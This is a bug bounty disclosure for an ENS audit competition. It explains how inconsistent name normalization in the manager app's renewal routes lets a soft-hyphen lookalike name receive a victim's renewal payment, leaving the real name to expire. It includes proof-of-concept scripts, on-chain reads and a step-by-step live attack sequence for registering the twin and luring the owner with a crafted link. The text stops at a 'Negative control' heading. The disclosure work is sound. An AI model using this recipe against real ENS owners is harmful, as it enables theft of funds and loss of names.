# 89467 w a critical inconsistent name normalization between the renewal checks and the renewal transaction leads to the user signing a renewal for an attacker controlled name

**Submitted on Aug 19th 2026 at 13:39:42 UTC by @tchoupilou for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #89467
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as:
    * resolving or rendering an ENS name to an attacker-controlled address
    * showing the wrong recipient or amount on a transaction the user then approves

## Description

## Brief/Intro

The renewal routes read the name from the URL and run it through two different normalizers: the expiry lookup that decides whether the page opens uses ENSIP-15 through `viem/ens`, while the label that reaches the transaction only goes through `trim().toLowerCase()`. For any input where those two disagree, the app validates and displays one name and asks the wallet to renew another, and with an invisible character such as a soft hyphen the two names are indistinguishable on the renewal screen and in the wallet confirmation. In production this lets an attacker who has pre-registered the invisible twin of a name send its owner an ordinary looking renewal link and collect the victim's renewal payment as registration time on the attacker's own name, while the victim's name is left unrenewed and heading for expiry.

## Vulnerability Details

Both renewal routes have the same shape. `apps/manager/src/routes/renew/$name.tsx`:

```ts
loader: async ({ params: { name }, context: { queryClient } }) => {
  const parsedName = parseRenewableName(name)          // line 20, weak normalization

  if (parsedName.isErr()) {                            // line 22
    throw parsedName.error
  }

  const expiryData = await queryClient.ensureQueryData(
    profileExpiryQuery(name),                          // line 27, ENSIP-15
  )

  // lines 30 to 50: protocol branch and grace-period redirect, both driven by
  // expiryData, which came from the ENSIP-15 name

  if (!canRenewV2Name(name, expiryDate)) {             // line 52, hybrid, see below
    throw new Error('This name is not available for renewal.')
  }

  return {
    label: parsedName.value.label,                     // line 61, this is what gets renewed
    currentExpiry: expiryData.expiry,                  // read from the other name
  }
}
```

`apps/manager/src/routes/renew-v1/$name.tsx` does the same at lines 15, 21, 36 and 51.

The loader checks that the name exists, is on the expected protocol, and is inside its renewal window. It does not check that the connected wallet owns the name. The v2 route never calls `profileOwnerQuery`. The v1 route calls it at line 21 but only reads `ownerData?.protocol` at lines 23 and 31 to pick between v1 and v2. The victim does not need to own the crafted name for the page to open.

Path A, used by the expiry lookup. `profileExpiryQuery` and `profileOwnerQuery` reach `normalizeEthName` and `normalizeEth2LdName` in `profile/service/profileName.ts`, which is `normalize(name)` from `viem/ens` at line 18.

Path B, used by the transaction. `parseRenewableName` in `renew/utils/renewableName.ts:25` calls `parseName` in `register-v2/utils/name-parser.ts`, where the only normalization is line 46:

```ts
const normalized = name.trim().toLowerCase()
```

`parseName` has two character guards and neither stops the payloads. A whitespace test at line 49, and an ASCII punctuation blacklist at lines 11 and 73:

```ts
const INVALID_LABEL_CHARS = /[&*@#$%^()[\]{}|\\:;"'<>?,=+~`!]/   // line 11
```

`parseRenewableName` adds only a TLD check and a subname check on top of that, so nothing there normalizes either.

**The gate at line 52 is a hybrid, and both halves pass.** `canRenewV2Name(name, expiryDate)` receives the raw route parameter, not the ENSIP-15 name, and `renewableName.ts:44` re-parses it through the weak path:

```ts
export const canRenewV2Name = (name: string, expiryDate: Date | null | undefined) => {
  const parsed = parseRenewableName(name)                                  // weak
  if (parsed.isErr()) return false
  return isRenewableV2EthName(`${parsed.value.label}.eth`, expiryDate)     // weak label, real expiry
}
```

`isRenewableV2EthName`, declared at `grace/utils/gracePeriod.ts:41`, tests the name it is given against `/^[^.]+\.eth$/` at line 48 and against nothing else, so the crafted label passes the syntax half, while `expiryDate` is the real expiry that came from the ENSIP-15 query and passes the window half. Step 2 runs both functions from the repository on the crafted input and shows the gate returning `true`. So the last check before the loader returns the poisoned label does not reject it, and the divergence is not a mismatch between one strict path and one weak path at a single point: the weak label is what the final gate itself is evaluating.

Nothing normalizes the label afterwards. `grep normalize apps/manager/src/features/renew` returns nothing. The label goes through `renew/state/renewalUi.machine.ts:349` into `packages/transaction-manager/src/machines/registration/registration.actors.ts`:

```ts
const cleanLabel = label.replace('.eth', '')              // line 1025
return encodeFunctionData({
  abi: ethRegistrarRenewSnippet,
  functionName: 'renew',
  args: [cleanLabel, duration, paymentToken, REFERER_ADDRESS],   // line 1029
})
```

Stripping a `.eth` suffix is the only transformation, so the crafted character lands in the `renew` argument. The same file builds the transaction description the user reads, from the same label:

```ts
description: `Renew ${input.label}.eth`,                  // line 1090
```

**Scope note.** The defect is in `apps/manager`, the asset named above. The renewal route produces a label that was never normalized and hands it on. The `packages/transaction-manager` lines are cited only to show nothing normalizes it downstream, which closes the path from URL to calldata. The program page states it is concerned with the transaction construction paths including `packages/transaction-manager`, and with anything that lets a transaction be built, signed, or attributed with the wrong chain, sender, target address, or arguments.

The price runs on the same weak label, at `renew/data/queries/renewPricing.query.ts:39`, which passes it straight to `ensGetRenewPrice`. So does the screen, at `renew/workflow/renewing/components/RenewalDetails.tsx:50`:

```tsx
domainName={`${submissionData.label}.eth`}
```

while `currentExpiry` on that same screen came from the ENSIP-15 name. The same primitive reaches bulk renewal, since `isRenewableV2Domain` at `renewableName.ts:55` calls `canRenewV2Name`.

Which inputs diverge, tested against `@adraffy/ens-normalize`, the library behind `viem/ens`:

```
U+00AD  soft hyphen         normalizes away entirely, no glyph at all, passes both
                            parseName guards. This is the payload used below.
U+FE0F  variation selector  also normalizes away entirely, also invisible, and emoji
                            names are common on ENS. Second working payload.
U+FF48  fullwidth h         normalizes to "h", only slightly wider on screen.
U+FB01  ligature fi         diverges but is plainly visible, so not useful.
U+2460  circled digit one   diverges but is plainly visible, so not useful.
U+200D  zero width joiner   ens_normalize throws, the page never opens, does not work.
U+0131  dotless i           ens_normalize throws, the page never opens, does not work.
```

**The attacker can create the lookalike in this same app, and the reason is a third normalizer.** `routes/register/$name.tsx` parses with the same `parseName` at line 24, checks availability at line 45, and redirects away at line 49 if the name is taken. That check goes through `normalizeDomainNameFromUrl` at `utils/domain.ts:27`, which strips a case-insensitively matched `.eth` suffix, truncates the label to 255 UTF-8 bytes and re-appends `.eth`. It does not lowercase the label and it performs no character validation whatsoever, so it asks about the raw crafted label. Step 2 runs that exact function from the repository and prints the codepoints. Step 5 shows the deployed registrar answering `isAvailable = true` for that raw label and accepting it into `makeCommitment`, so the availability check reports available and registration proceeds with `parsedName.value.label` intact.

So the same app reads the same input three ways: ENSIP-15 for the expiry and owner lookups, `trim().toLowerCase()` for the transaction label and for the final renewability gate, and `normalizeDomainNameFromUrl` for availability. There is no canonical form.

**Why this is not EXP-INPUT-005.** That entry covers name validators accepting homoglyphs and control characters, and states its own boundary: the practical impact is "homograph-style display confusion in our UI rather than incorrect resolution". This report is on the other side of it, because the signed transaction targets a different name than the one that was checked and shown, which is incorrect resolution.

The two also need different fixes, and the reason is structural. EXP-INPUT-005 is about a validator being too permissive. The renewal transaction path does not call a validator at all: it calls `parseName`, whose entire normalization is `trim().toLowerCase()`. Hardening the ENSIP-15 side changes nothing on that path, because that path never reaches the ENSIP-15 side. Applying the EXP-INPUT-005 fix in full leaves this exploit working unchanged. The defect here is the absence of a single canonical form shared by the checks, the price, the display and the calldata, not the strictness of any one validator.

## Recommended fix

Normalize once, at the route boundary, and derive everything from that value. In both renewal loaders, run the route parameter through ENSIP-15 `normalize` before anything else, and reject the request when `normalize(input) !== input`, so a crafted variant fails closed. Then build the transaction label from the normalized value rather than from `parseName`, and pass the normalized value to `canRenewV2Name` rather than the raw parameter, so the checked name, the priced name, the displayed name and the signed name are one string.

The same change is needed in `parseName` itself, or at every call site that feeds a transaction, since `register/$name.tsx:24` and the bulk renewal path at `renewableName.ts:55` use it too. Reusing `normalizeDomainNameFromUrl` for availability should be dropped in the same pass, since it is the third form and it is what lets the twin be minted.

## Impact Details

The attacker sends the victim a renewal link for a name the victim owns, with an invisible character inserted. Writing the victim's label as `<victim>`:

```
https://<manager-host>/renew/<victim><U+00AD>.eth
```

A soft hyphen is percent encoded in a URL path, so a client that renders the raw URL as its own link text will show `%C2%AD`. That is the weakest surface for the attack and it is not the one it depends on: the natural delivery for a renewal reminder is anchor text, a button in an HTML email, or a shortened link, none of which expose the encoding. Nor is the address bar what the user reads before signing. The renewal screen decodes the parameter and renders it at `RenewalDetails.tsx:50`, where the character has no glyph, and the app builds the wallet transaction description from the same label at `registration.actors.ts:1090`. **At the two moments that decide whether the user signs, the name shown is byte-for-byte indistinguishable from the real one.**

The page opens. The expiry lookup at line 27 normalizes to `<victim>.eth`, so it resolves and the expiry on screen is the real expiry of `<victim>.eth`. The final gate at line 52 evaluates the crafted label against `/^[^.]+\.eth$/` and that real expiry, and returns `true`. Step 2 runs the repository's own `parseRenewableName` and `canRenewV2Name` on the crafted input and shows both passing.

The price does not give it away either. The deployed registrar prices by label length, and the tiers are far apart at the short end: three characters cost 640000005, four cost 160000009, and everything from five up sits flat at 8000021. A soft hyphen adds one codepoint, so the twin stays in the victim's tier only when the victim's label is at least five characters. Read off the deployed registrar, using the real registered name `hello.eth` as the worked example:

```
getRenewPrice("hello", 1y, tok)           = 8000021
getRegisterPrice("hello"+U+00AD, 1y, tok) = 8000021
```

The victim sees the price they expect. Step 4 has the commands.

The transaction that goes to the wallet renews `<victim><U+00AD>.eth`.

The attacker has to register `<victim><U+00AD>.eth` before sending the link. This is not an optional refinement, it is the only version that works: pricing runs on the weak label, so if the twin is unregistered the price call reverts and the page fails before the wallet is involved. Step 4 shows that revert against the deployed registrar. Step 5 shows the same registrar reporting the crafted label available and accepting it into the commitment, so the twin can in fact be minted.

**Cost to the attacker.** The twin does not have to be registered for a year. `MIN_REGISTER_DURATION()` on the deployed registrar is 2419200 seconds, twenty-eight days, and the price at that duration is 613701 against the 8000021 the victim pays for one year. The attacker's entry cost is therefore about 7.7 percent of what the first victim hands over, and the twin can be topped up out of the proceeds for as long as it keeps producing. `MIN_RENEW_DURATION()` is 1 second, so the top-up is granular. This is an attack that funds itself on its first success.

**Loss.** The immediate loss per victim is one full renewal payment, denominated in the ERC-20 the registrar accepts, plus the renewal duration the victim believed they bought. At the flat tier read above, one year is 8000021 units.

The larger loss is the name. A renewal link is something an owner acts on precisely when expiry is close, and the whole point of the flow is that the victim comes away believing the name is renewed: the expiry they were shown was the real one, the price was the expected one, the confirmation carried their own name, and the transaction succeeded. Nothing in the app tells them otherwise afterwards. So the victim stops paying attention to a name that is still on its original expiry. `GRACE_PERIOD()` on the deployed registrar is 2419200 seconds, twenty-eight days, after which the name is released and can be taken by anyone, including the attacker who already knows the exact date. The realistic worst case is therefore loss of the ENS name itself, not the renewal fee, and this is the ordinary outcome of the attack rather than an unlucky variant of it, because the attack works by convincing the victim that no further action is needed.

Nothing caps the number of victims or the duration a victim can be induced to buy, so the amount at risk scales with the duration selected on the renewal screen and with the number of owners of that name who click the link.

**On the user interaction.** The attack requires the victim to open a link and approve a transaction, and that is not a mitigating condition here, it is the definition of the impact category selected. The in-scope impact reads: causing the application to display or pre-fill an incorrect transaction detail *so that a user sends funds or submits a transaction to an unintended recipient*. A user approving something is what that category describes. What distinguishes this from ordinary phishing is that the deception is produced by the application itself rather than by the attacker: the domain is the real one, the page is the real one, the expiry is fetched live and is correct, the price is correct, and the name rendered on the confirmation is generated by the app's own code from the app's own state. There is nothing the victim could have inspected in the app that would have revealed the substitution, and no wallet compromise is involved. The attacker's only contribution is one codepoint in a URL.

One URL is read three ways. The expiry on screen uses `<victim>.eth`. The price, the renewability gate, the name on the confirmation, and the label in the signed transaction use `<victim><U+00AD>.eth`. The user is shown the first and signs against the second. That matches the selected in-scope impact: the app pre-fills an incorrect transaction detail, and the user submits a transaction against a target they did not choose.

## References

All paths at commit `1c9b47f1`.

* `apps/manager/src/routes/renew/$name.tsx` lines 19, 20, 22, 27, 30, 40, 44, 52, 61, 62
* `apps/manager/src/routes/renew-v1/$name.tsx` lines 15, 21, 23, 31, 36, 51
* `apps/manager/src/features/renew/utils/renewableName.ts` lines 25, 40, 44, 55
* `apps/manager/src/features/grace/utils/gracePeriod.ts` line 41, and line 48, the `/^[^.]+\.eth$/` syntax test
* `apps/manager/src/features/register-v2/utils/name-parser.ts` lines 11, 46, 49, 73
* `apps/manager/src/routes/register/$name.tsx` lines 24, 45, 49
* `apps/manager/src/utils/domain.ts` line 27, the third normalizer
* `apps/manager/src/features/profile/service/profileName.ts` lines 1 and 18
* `apps/manager/src/features/profile/service/profileExpiry.ts` line 77
* `apps/manager/src/features/profile/service/profileOwner.ts` lines 25 and 30
* `apps/manager/src/features/renew/data/queries/renewPricing.query.ts` line 39
* `apps/manager/src/features/renew/state/renewalUi.machine.ts` line 349
* `apps/manager/src/features/renew/workflow/renewing/components/RenewalDetails.tsx` line 50
* `packages/transaction-manager/src/machines/registration/registration.actors.ts` lines 1020, 1025, 1029, 1090, cited as the downstream sink
* ENS v2 Sepolia registrar queried in steps 4 and 5: `0xa88553F454b77203B0D036A05c894d555EAAa2Cc`, from `ensL1Contracts[supportedL1Chains.sepolia].ensEthRegistrar`
* ENSIP-15: <https://docs.ens.domains/ensip/15>
* `@adraffy/ens-normalize`, the library behind `viem/ens`: <https://github.com/adraffy/ens-normalize.js>

## Proof of Concept

Setup: two accounts. Account A is the attacker. Account B is the victim and owns a `.eth` name whose label is at least five characters, for the pricing reason in the Impact Details. That label is written `<victim>` below.

**Naming convention.** Steps 1 to 5 are worked with the literal label `hello`, because `hello.eth` is a real registered five character name on the deployed Sepolia registrar, which means anyone can reproduce those reads with an RPC and no wallet. Nothing in steps 1 to 5 requires owning it. Steps 6 to 9 are the live sequence and run on `<victim>`, the name account B actually owns. The two are interchangeable for the purposes of the bug, since the only property that matters is a label of at least five characters.

**What was executed.** Steps 1 to 5 were run and their output is pasted below verbatim, with no wallet and no funds. Step 1 and step 3 are offline. Step 2 runs the repository's own functions from a checkout at `1c9b47f1`. Steps 4 and 5 are read-only `eth_call` against the deployed registrar. Together they establish the whole chain from URL parameter to calldata, every loader gate the crafted input has to pass, and every on-chain precondition, including the one the attack depends on most, which is that the crafted label is registrable. Steps 6 to 9 are the wallet-signing sequence against a running instance, written as a reproduction procedure with the expected result at each point.

Payloads are written as `\u` escapes rather than literal invisible characters, so the scripts survive copy and paste.

{% stepper %}
{% step %}

## The two normalizers disagree, and neither guard stops it

```bash
npm install @adraffy/ens-normalize
cat > poc.js <<'EOF'
const { ens_normalize } = require('@adraffy/ens-normalize')
const INVALID_LABEL_CHARS = /[&*@#$%^()[\]{}|\\:;"'<>?,=+~`!]/
 
const cases = [
  ['00AD soft hyphen',    '\u00AD'], ['FE0F var selector', '\uFE0F'],
  ['FF48 fullwidth h',    '\uFF48'], ['FB01 ligature fi',  '\uFB01'],
  ['2460 circled 1',      '\u2460'], ['200D ZWJ',          '\u200D'],
  ['0131 dotless i',      '\u0131'],
]
for (const [n, c] of cases) {
  const input = 'hello' + c + '.eth'
  let r
  try { r = JSON.stringify(ens_normalize(input)) } catch (e) { r = 'THROWS: ' + e.message }
  console.log(n.padEnd(20), '| norm:', String(r).padEnd(14),
              '| weak len:', input.trim().toLowerCase().length,
              '| \\s:', /\s/.test(c), '| INVALID:', INVALID_LABEL_CHARS.test(c))
}
console.log('---')
const input = 'hello\u00AD.eth'
console.log('checks and pricing use :', JSON.stringify(ens_normalize(input)), 'len', ens_normalize(input).length)
console.log('transaction uses       :', JSON.stringify(input.trim().toLowerCase()), 'len', input.length)
EOF
node poc.js
```

```
00AD soft hyphen     | norm: "hello.eth"    | weak len: 10 | \s: false | INVALID: false
FE0F var selector    | norm: "hello.eth"    | weak len: 10 | \s: false | INVALID: false
FF48 fullwidth h     | norm: "helloh.eth"   | weak len: 10 | \s: false | INVALID: false
FB01 ligature fi     | norm: "hellofi.eth"  | weak len: 10 | \s: false | INVALID: false
2460 circled 1       | norm: "hello1.eth"   | weak len: 10 | \s: false | INVALID: false
200D ZWJ             | norm: THROWS: Invalid label "hello{200D}": disallowed character: {200D} | weak len: 10 | \s: false | INVALID: false
0131 dotless i       | norm: THROWS: Invalid label "helloı": disallowed character: "ı" {131} | weak len: 10 | \s: false | INVALID: false
---
checks and pricing use : "hello.eth" len 9
transaction uses       : "hello­.eth" len 10
```

The last two lines are two different names for the same input. The second reads as `"hello.eth"` on screen even inside the quotes, because `JSON.stringify` does not escape U+00AD and the character has no glyph. The lengths, 9 against 10, are what make the difference visible. Two payloads, U+00AD and U+FE0F, normalize away completely and are invisible, and neither guard in `parseName` rejects any of the seven.
{% endstep %}

{% step %}

## The app's own code, run against the crafted input

This step imports the repository's functions rather than reimplementing them, so it needs a checkout. It settles three things: which label the availability check asks about, which label the loader hands to the transaction, and whether the last gate before that handoff rejects the crafted input. It does not.

The dependencies are installed in a scratch directory beside the clone rather than inside it, because the workspace `package.json` uses pnpm's `catalog:` protocol, which npm refuses. The `tsconfig` supplies the two path aliases the source files use, and the `node_modules` symlink lets the repository's own files resolve `neverthrow` and `ts-pattern` from their own location.

```bash
git clone https://github.com/immunefi-team/audit-comp-ens
git -C audit-comp-ens checkout 1c9b47f1
 
mkdir poc && cd poc && npm init -y
npm install tsx neverthrow ts-pattern @adraffy/ens-normalize
ln -s "$PWD/node_modules" ../audit-comp-ens/node_modules
 
cat > tsconfig.json <<'EOF'
{
  "compilerOptions": {
    "module": "esnext",
    "moduleResolution": "bundler",
    "allowImportingTsExtensions": true,
    "noEmit": true,
    "paths": {
      "@ens-apps/utils/*": ["../audit-comp-ens/packages/utils/src/*"],
      "@/*": ["../audit-comp-ens/apps/manager/src/*"]
    }
  }
}
EOF
 
cat > repo.ts <<'EOF'
import { ens_normalize } from '@adraffy/ens-normalize'
import { normalizeDomainNameFromUrl } from '../audit-comp-ens/apps/manager/src/utils/domain.ts'
import {
  parseRenewableName,
  canRenewV2Name,
} from '../audit-comp-ens/apps/manager/src/features/renew/utils/renewableName.ts'
 
const cp = (s: string) => [...s].map((c) => c.codePointAt(0)!.toString(16)).join(' ')
const crafted = 'hello\u00AD.eth'
const honest = 'hello.eth'
// stands in for the expiry profileExpiryQuery returns for the ENSIP-15 name,
// i.e. the real expiry of hello.eth, inside the renewal window
const realExpiry = new Date(Date.now() + 40 * 86400 * 1000)
 
console.log('A. availability path, utils/domain.ts:27')
console.log('   normalizeDomainNameFromUrl :', cp(normalizeDomainNameFromUrl(crafted)))
console.log('   ens_normalize              :', cp(ens_normalize(crafted)))
 
console.log('B. transaction label, renewableName.ts:25 -> name-parser.ts:46')
console.log('   parseRenewableName isOk    :', parseRenewableName(crafted).isOk())
console.log('   label passed to renew()    :', cp(parseRenewableName(crafted)._unsafeUnwrap().label))
console.log('   ens_normalize label        :', cp(ens_normalize(crafted).slice(0, -4)))
 
console.log('C. loader gate, renew/$name.tsx:52')
console.log('   canRenewV2Name(crafted)    :', canRenewV2Name(crafted, realExpiry))
console.log('   canRenewV2Name(honest)     :', canRenewV2Name(honest, realExpiry))
EOF
npx tsx --tsconfig tsconfig.json repo.ts
```

Printed as codepoints, because the strings are visually identical as text:

```
A. availability path, utils/domain.ts:27
   normalizeDomainNameFromUrl : 68 65 6c 6c 6f ad 2e 65 74 68
   ens_normalize              : 68 65 6c 6c 6f 2e 65 74 68
B. transaction label, renewableName.ts:25 -> name-parser.ts:46
   parseRenewableName isOk    : true
   label passed to renew()    : 68 65 6c 6c 6f ad
   ens_normalize label        : 68 65 6c 6c 6f
C. loader gate, renew/$name.tsx:52
   canRenewV2Name(crafted)    : true
   canRenewV2Name(honest)     : true
```

**A.** The `ad` in sixth position is the soft hyphen, present in what the availability path asks about and absent from what ENSIP-15 produces. The query therefore asks the registrar about the raw crafted label, and step 5 is the registrar's answer to that exact question.

**B.** `parseRenewableName` accepts the crafted input, and the label it returns at `$name.tsx:61`, the value that becomes the `renew` argument, still carries the `ad`. The ENSIP-15 label on the line below is what every check on the other path saw.

**C.** This is the gate at line 52, the last thing that runs before the loader returns that label. It receives the raw route parameter, re-parses it through the weak path, and tests `hello` + U+00AD + `.eth` against `/^[^.]+\.eth$/` with the real expiry date. It returns `true`, exactly as it does for the honest name. There is no check anywhere in the loader that the crafted input fails.
{% endstep %}

{% step %}

## The two URLs produce two different renewal transactions

An exact copy of `encodeRenewData` from `registration.actors.ts` lines 1020 to 1031, against the same `@ensdomains/ensjs-abi` build the repo pins in `pnpm-workspace.yaml` line 11, so the ABI is the one the app really encodes with.

```bash
npm install viem "https://pkg.pr.new/ensdomains/ensjs/@ensdomains/ensjs-abi@e96662c"
cat > calldata.js <<'EOF'
const { encodeFunctionData, keccak256, stringToBytes } = require('viem')
const { ethRegistrarRenewSnippet } = require('@ensdomains/ensjs-abi/v2/ethRegistrar')
 
const REFERER_ADDRESS = '0x' + '00'.repeat(32)   // zeroHash, as set in ens-sepolia.ts
function encodeRenewData(label, duration, paymentToken) {
  const cleanLabel = label.replace('.eth', '')
  return encodeFunctionData({
    abi: ethRegistrarRenewSnippet,
    functionName: 'renew',
    args: [cleanLabel, duration, paymentToken, REFERER_ADDRESS],
  })
}
 
const duration = 31536000n
const token = '0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238' // placeholder, identical in both calls
const a = encodeRenewData('hello', duration, token)
const b = encodeRenewData('hello\u00AD', duration, token)
console.log('calldata for /renew/hello.eth        :', a)
console.log('calldata for /renew/hello+U+00AD.eth :', b)
console.log('identical?', a === b)
console.log('labelhash hello        :', keccak256(stringToBytes('hello')))
console.log('labelhash hello+U+00AD :', keccak256(stringToBytes('hello\u00AD')))
EOF
node calldata.js
```

```
calldata for /renew/hello.eth        : 0x89d779c300000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000001e133800000000000000000000000001c7d4b196cb0c7b01d743fbc6116a902379c72380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000568656c6c6f000000000000000000000000000000000000000000000000000000
calldata for /renew/hello+U+00AD.eth : 0x89d779c300000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000001e133800000000000000000000000001c7d4b196cb0c7b01d743fbc6116a902379c72380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000768656c6c6fc2ad00000000000000000000000000000000000000000000000000
identical? false
labelhash hello        : 0x1c8aff950685c2ed4bc3174f3472287b56d9517b9c948127319a09a7a36deac8
labelhash hello+U+00AD : 0xfb9b2510b28492c1c3ed42ea3f5cb857553e1ab05f6993aba648ed0ea0e8e577
```

The selector is `0x89d779c3`, which is `renew(string,uint64,address,bytes32)`. The tails differ. The honest one encodes a string of length 5, `68656c6c6f`, which is `hello`. The crafted one encodes length 7, `68656c6c6fc2ad`, which is `hello` followed by the UTF-8 bytes of the soft hyphen, the same `ad` codepoint step 2 printed coming out of `parseRenewableName`. The payment token is a placeholder and identical in both calls, so only the label varies. The labelhashes differ, so these are two different names on chain.
{% endstep %}

{% step %}

## The deployed registrar treats them as two names, at the same price

No funds and no wallet, only a Sepolia RPC.

```bash
RPC=https://ethereum-sepolia-rpc.publicnode.com
REG=0xa88553F454b77203B0D036A05c894d555EAAa2Cc
TOK=0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238
CRAFTED=$(printf 'hello\xc2\xad')
 
cast call $REG 'isRenewable(string)(bool)' 'hello'    --rpc-url $RPC
cast call $REG 'isRenewable(string)(bool)' "$CRAFTED" --rpc-url $RPC
cast call $REG 'getRenewPrice(string,uint64,address)(uint256)' 'hello'    31536000 $TOK --rpc-url $RPC
cast call $REG 'getRenewPrice(string,uint64,address)(uint256)' "$CRAFTED" 31536000 $TOK --rpc-url $RPC
```

```
true
false
8000021 [8e6]
Error: server returned an error response: error code 3: execution reverted, data: "0x1caefaa00000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000768656c6c6fc2ad00000000000000000000000000000000000000000000000000"
```

Decode the revert to see the contract hand the crafted label back:

```bash
cast sig 'NameNotRenewable(string)'
cast decode-error --sig 'NameNotRenewable(string)' \
  0x1caefaa00000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000768656c6c6fc2ad00000000000000000000000000000000000000000000000000
```

```
0x1caefaa0
"hello\u{ad}"
```

The selector in the revert data is `NameNotRenewable(string)`, and Foundry prints the rejected label escaping the soft hyphen as `\u{ad}` because it has no glyph. Same invisible character the app puts in the transaction. This is also why the twin has to exist before the link is sent, and why step 5 matters.

Now the price tiers, read with unregistered labels, then the crafted twin:

```bash
for n in 3 4 5 6; do
  L=$(echo 'zqx7v9' | cut -c1-$n)
  printf 'len=%d %-8s ' $n "$L"
  cast call $REG 'getRegisterPrice(string,uint64,address)(uint256,uint256)' "$L" 31536000 $TOK --rpc-url $RPC | tr '\n' ' '
  echo
done
 
cast call $REG 'getRegisterPrice(string,uint64,address)(uint256,uint256)' "$CRAFTED" 31536000 $TOK --rpc-url $RPC
```

```
len=3 zqx      640000005 [6.4e8] 0
len=4 zqx7     160000009 [1.6e8] 0
len=5 zqx7v    8000021 [8e6] 0
len=6 zqx7v9   8000021 [8e6] 0
8000021 [8e6]
0
```

Prices fall steeply up to four characters and sit flat from five up. `hello` is five and the twin is six, so both are on the flat tier and land on the same figure as the renewal price above, 8000021. The victim's screen shows the price they expect. A four character victim name would drop from 160000009 to 8000021 and put a twenty fold discount on screen, which is why the label must be at least five characters.
{% endstep %}

{% step %}

## The registrar reports the crafted label as available, accepts it into a commitment, and prices it cheaply at the minimum duration

This is the precondition the whole attack rests on. If the deployed registrar rejected the crafted label on its registration path, the twin could never be minted and nothing above would matter. It does not reject it. Read-only, still no wallet and no funds.

```bash
cast call $REG 'isAvailable(string)(bool)' 'hello'    --rpc-url $RPC
cast call $REG 'isAvailable(string)(bool)' "$CRAFTED" --rpc-url $RPC
 
# makeCommitment(label, owner, secret, registry, resolver, duration, referrer)
# any owner/registry/resolver work for a read, only the label varies between the two calls
OWNER=0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238
ZERO=0x0000000000000000000000000000000000000000000000000000000000000000
cast call $REG 'makeCommitment(string,address,bytes32,address,address,uint64,bytes32)(bytes32)' \
  'hello'    $OWNER $ZERO $OWNER $OWNER 31536000 $ZERO --rpc-url $RPC
cast call $REG 'makeCommitment(string,address,bytes32,address,address,uint64,bytes32)(bytes32)' \
  "$CRAFTED" $OWNER $ZERO $OWNER $OWNER 31536000 $ZERO --rpc-url $RPC
 
cast call $REG 'GRACE_PERIOD()(uint64)'          --rpc-url $RPC
cast call $REG 'MIN_REGISTER_DURATION()(uint64)' --rpc-url $RPC
cast call $REG 'MIN_RENEW_DURATION()(uint64)'    --rpc-url $RPC
cast call $REG 'getRegisterPrice(string,uint64,address)(uint256,uint256)' "$CRAFTED" 2419200 $TOK --rpc-url $RPC
```

```
false
true
0xb9072ca9451dee79d3eb51ff34420cec2799eb56018503aa10d4a0f4c812d094
0x5b0db8f243bd8fdf872e20cd1ad587d4bbd55527de86284a1f4f29e6ee91b96b
2419200
2419200
1
613701
0
```

`isAvailable("hello")` is false because the name is registered. `isAvailable("hello"+U+00AD)` is true: the registrar considers the crafted label an unregistered, registrable name. There is no on-chain label validation that collapses it back onto `hello` or rejects the codepoint, and `getRegisterPrice` in step 4 already quoted it a price rather than reverting.

`makeCommitment` accepts the crafted label and returns a commitment distinct from the one for `hello`, so the commit-reveal path the app drives has no guard against it either. Registration is a `commit` at that hash followed by `register` with the same arguments, which is exactly what the app's registration flow does with `parsedName.value.label`.

The last four reads are the economics in the Impact Details. `GRACE_PERIOD()` is twenty-eight days, the window after which the victim's unrenewed name is released. `MIN_REGISTER_DURATION()` is also twenty-eight days and costs 613701 for the crafted label, against the 8000021 the victim pays for a year, so the attacker's entry cost is roughly 7.7 percent of the first victim's payment. `MIN_RENEW_DURATION()` is 1 second, so the twin can be topped up in arbitrarily small increments out of the proceeds.

Between this and step 2, both halves of the twin's creation are covered: the app asks about the raw crafted label, and the registrar answers that it is available, registrable and cheap.
{% endstep %}

{% step %}

## The attacker registers the twin

As account A, open `/register/<victim><U+00AD>.eth` in a running instance. Steps 2 and 5 are why this is accepted rather than redirected at `register/$name.tsx:49`. Complete the commit-reveal flow at the minimum duration.

Expected result: `isAvailable("<victim>"+U+00AD)` now returns false, and the token is owned by account A. Record the registration transaction hash.
{% endstep %}

{% step %}

## The victim opens the crafted link

As account B, connected with the wallet that owns `<victim>.eth`, open the link below. Paste it rather than typing it so the invisible character survives.

```
https://<manager-host>/renew/<victim><U+00AD>.eth
```

Expected result: the page opens. Step 2C already showed that no gate in the loader rejects the crafted input, so what this step adds is the browser half: that the soft hyphen survives URL decoding into `params.name`, and that it renders without a glyph. The expiry on screen is the real expiry of `<victim>.eth`, from `profileExpiryQuery` at line 27. The price comes from `renewPricing.query.ts:39`, quoted with the weak label, and is 8000021 for a one year selection by the tier read in step 4. The name printed at `RenewalDetails.tsx:50` is the weak label, visually identical to `<victim>.eth`.

Note for reproduction: the soft hyphen travels as `%C2%AD` in the path and is decoded back into the route parameter before the loader runs, which is what puts the raw codepoint into `parseName`. Confirm this in the browser by logging `params.name` in the loader, or by observing that the price call in the network tab carries the crafted label.
{% endstep %}

{% step %}

## Sign, and read the chain

Continue to the confirmation. The description shown is built at `registration.actors.ts:1090` from the same label.

Expected result: the calldata carries the crafted label as its trailing string argument, one UTF-8 byte pair `c2ad` longer than the honest encoding from step 3, while the name on screen reads `<victim>.eth`. Capture a screenshot of the confirmation next to the decoded calldata.

Then sign, and read both expiries. Expected result: `<victim><U+00AD>.eth`, owned by account A, has moved forward by the purchased duration. `<victim>.eth`, owned by account B, is unchanged. Record both transaction hashes and both expiries before and after.
{% endstep %}

{% step %}

## Negative control

Repeat steps 7 and 8 with the plain URL `/renew/<victim>.eth`.

